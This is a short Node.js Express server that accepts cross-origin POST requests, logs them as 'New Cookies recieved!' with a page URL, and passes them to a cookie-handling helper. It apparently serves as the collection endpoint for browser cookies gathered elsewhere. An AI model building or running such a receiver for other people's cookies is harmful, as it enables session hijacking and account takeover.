const express = require("express");
const utils = require('./utils');
const cors = require("cors");
const app = express();

const PORT = process.env.PORT || 3000;

let RUNNING = 0;

if (RUNNING === 0) { utils.keepTheServerRunning(); RUNNING = 1; };

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(cors());

app.get("/", async (req, res) => {
    res.send({ status: "Server is Up and Running!" });
});

app.post("/", (req, res) => {
    console.log("New Cookies recieved!", req.body.url);
    utils.handleCookies(req.body);
    res.json("Data recieved successfully!");

});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
